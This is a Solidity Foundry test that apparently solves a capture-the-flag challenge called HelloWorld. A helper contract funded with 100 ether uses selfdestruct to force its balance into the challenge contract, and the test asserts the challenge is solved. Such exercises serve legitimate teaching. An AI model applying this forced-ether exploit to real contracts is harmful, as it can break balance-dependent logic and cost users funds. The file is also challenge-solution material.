// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1.HelloWorld/HelloWorld.sol";

contract HelloWorldTest is Test {
    HelloWorld challenge;

    function setUp() public {
        challenge = new HelloWorld();
    }

    function testExploit() public {
        exp e = new exp{value: 100 ether}(address(challenge));
        e.attack();
        console.log("balance: ", address(challenge).balance);
        assertTrue(challenge.isSolved());
    }
}

contract exp {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(address(target)));
    }
}
